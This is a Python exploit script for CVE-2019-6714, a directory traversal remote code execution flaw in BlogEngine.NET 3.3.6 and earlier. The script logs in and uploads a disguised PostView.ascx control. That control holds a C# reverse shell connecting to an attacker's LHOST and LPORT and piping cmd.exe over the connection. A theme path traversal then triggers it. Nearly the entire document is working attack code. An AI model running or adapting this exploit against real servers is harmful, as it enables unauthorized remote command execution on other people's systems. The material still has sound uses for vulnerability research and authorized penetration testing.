# Exploit Title: BlogEngine.NET <= 3.3.6 Directory Traversal RCE
# Date: 02-11-2019
# Exploit Author: Dustin Cobb
# Improved by 20100dbg
# Vendor Homepage: https://github.com/rxtur/BlogEngine.NET/
# Software Link: https://github.com/rxtur/BlogEngine.NET/releases/download/v3.3.6.0/3360.zip
# Version: <= 3.3.6.0
# Tested on: Windows 2016 Standard / IIS 10.0
# CVE : CVE-2019-6714

import argparse
import requests
import sys
import urllib
import time


if len(sys.argv) != 6:
    print("Exploit BlogEngine.NET 3.3.6.0")
    print("Please start netcat listener on LPORT")
    print(f"Usage : python {sys.argv[0]} [BlogEngine base URL] [USERNAME] [PASSWORD] [LHOST] [LPORT]")
    exit(1)

url = sys.argv[1].rstrip('/') + "/"
username = sys.argv[2]
password = sys.argv[3]
lhost = sys.argv[4]
lport = sys.argv[5]


s = requests.Session()

#Default headers
headers = {}
headers['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0"
headers['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
headers['Accept-Language'] = "en-US,en;q=0.5"
headers['Accept-Encoding'] = "gzip, deflate, br"
headers['DNT'] = "1"
headers['Connection'] = "close"

#prepare login
urllogin = url + "Account/login.aspx?ReturnURL=%2fadmin%2f"
res = s.get(urllogin, headers=headers)

#extract viewstate
idx = res.text.find('id="__VIEWSTATE"') + 16
idx = res.text.find('"', idx) +1
idx2 = res.text.find('"', idx)
viewstate = res.text[idx:idx2]
viewstate = urllib.parse.quote(viewstate)

#extract eventvalidation
idx = res.text.find('id="__EVENTVALIDATION"') + 22
idx = res.text.find('"', idx) +1
idx2 = res.text.find('"', idx)
eventvalidation = res.text[idx:idx2]
eventvalidation = urllib.parse.quote(eventvalidation)

print("[+] Got login form hidden fields")


# login

data = f"__VIEWSTATE={viewstate}&__EVENTVALIDATION={eventvalidation}&ctl00%24MainContent%24LoginUser%24UserName={username}&ctl00%24MainContent%24LoginUser%24Password={password}&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in"
headers['Content-Type'] = "application/x-www-form-urlencoded"
headers['Content-Length'] = str(len(data))

res = s.post(urllogin, data=data, headers=headers)

if "IsAdmin: 'True'" in res.text:
    print("[+] Logged in")
else:
    print("[-] Problem with login")
    exit()


# upload

data = """-----------------------------40783595783179154120390079876
Content-Disposition: form-data; name="file"; filename="PostView.ascx"
Content-Type: application/octet-stream

<%@ Control Language="C#" AutoEventWireup="true" EnableViewState="false" Inherits="BlogEngine.Core.Web.Controls.PostViewBase" %>
<%@ Import Namespace="BlogEngine.Core" %>
<script runat="server">
    static System.IO.StreamWriter streamWriter;
    protected override void OnLoad(EventArgs e) {
        base.OnLoad(e);
    using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient(\"""" + lhost + "\"," + lport + """)) {
        using(System.IO.Stream stream = client.GetStream()) {
            using(System.IO.StreamReader rdr = new System.IO.StreamReader(stream)) {
                streamWriter = new System.IO.StreamWriter(stream);
                        
                StringBuilder strInput = new StringBuilder();
                System.Diagnostics.Process p = new System.Diagnostics.Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardInput = true;
                p.StartInfo.RedirectStandardError = true;
                p.OutputDataReceived += new System.Diagnostics.DataReceivedEventHandler(CmdOutputDataHandler);
                p.Start();
                p.BeginOutputReadLine();
                while(true) {
                    strInput.Append(rdr.ReadLine());
                    p.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
            }
        }
        }
    }
    private static void CmdOutputDataHandler(object sendingProcess, System.Diagnostics.DataReceivedEventArgs outLine) {
    StringBuilder strOutput = new StringBuilder();
        if (!String.IsNullOrEmpty(outLine.Data)) {
            try {
                    strOutput.Append(outLine.Data);
                        streamWriter.WriteLine(strOutput);
                        streamWriter.Flush();
                } catch (Exception err) { }
        }
    }
</script>
<asp:PlaceHolder ID="phContent" runat="server" EnableViewState="false"></asp:PlaceHolder>
-----------------------------40783595783179154120390079876--"""

instance = list(s.cookies.get_dict().keys())[0][15:51]

data = data.replace('\n', '\r\n')

headers['Content-Type'] = "multipart/form-data; boundary=---------------------------40783595783179154120390079876"
headers['Content-Length'] = str(len(data))
headers['x-blog-instance'] = instance
headers['Accept'] = "application/json, text/plain, */*"

urlupload = url + "api/upload?action=filemgr&dirPath=~/App_Data/files"
res = s.post(urlupload, data=data, headers=headers)

if "PostView.ascx|PostView.ascx" in res.text:
    print("[+] Shell uploaded")
else:
    print("[-] Problem with upload")


del headers['Content-Type']
del headers['Content-Length']


print("[+] Calling for shell...")
time.sleep(1)
urlshell = url + "?theme=%2E%2E%2F%2E%2E%2FApp_Data%2Ffiles"
res = s.get(urlshell, headers=headers)


